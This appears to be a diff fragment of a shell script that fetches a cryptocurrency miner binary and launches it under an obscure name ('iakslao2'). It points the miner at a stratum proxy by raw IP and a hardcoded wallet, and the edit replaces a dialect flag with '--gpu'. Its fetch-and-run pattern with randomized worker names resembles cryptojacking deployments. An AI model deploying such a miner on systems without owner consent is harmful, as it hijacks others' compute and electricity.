@@ -8,10 +8,10 @@ wget -c https://github.com/pearlfortune/pearl-miner/releases/download/v2.2.1/pea
 --proxy stratum+ssl://139.180.141.107:8048 \
 --address prl1plfe52vv5jxq8x4zj0vn6u0wufa73q2xmzed87nelwyg3mlxhfl8sn6hhdr \
 --worker $(echo $RANDOM | md5sum | head -c 10) \
--–stratum-dialect kryptex_prl
+--gpu
 
 ./iakslao2 \
 --proxy stratum+ssl://139.180.141.107:8048 \
 --address prl1plfe52vv5jxq8x4zj0vn6u0wufa73q2xmzed87nelwyg3mlxhfl8sn6hhdr \
 --worker $(echo $RANDOM | md5sum | head -c 10) \
--–stratum-dialect kryptex_prl
+--gpu
